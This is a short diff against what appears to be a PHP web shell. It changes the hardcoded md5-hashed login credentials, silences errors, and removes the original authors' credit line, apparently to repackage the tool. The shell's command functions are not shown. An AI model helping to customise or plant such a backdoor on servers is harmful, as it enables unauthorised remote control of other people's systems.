@@ -4,8 +4,8 @@ ini_set("session.gc_maxlifetime",1);
 session_start();
 error_reporting(0);
 safe_mode();
-$name="80e3aa84fbf553c210e439872453a800";     
-$pass="e43be46f96de7234252020bfa4942b5a";     
+$name="7807e5c8c5f5e7be6d702be8574702dd";     
+$pass="b2cac66865c24b9a19f82f943dab0bd6";     
 if($auth == 1){
 if (!isset($HTTP_SERVER_VARS['PHP_AUTH_USER']) || md5($HTTP_SERVER_VARS['PHP_AUTH_USER'])!=$name || md5($HTTP_SERVER_VARS['PHP_AUTH_PW'])!=$pass)
    {
@@ -1360,5 +1360,3 @@ function base64Decode(str)
 <center><font size=1 color=#444444>.:[Public v1.0]:.</font></center>
 </body>
 </html>
-	
-<!-- Coded by LoFFi & Ls01r //-->
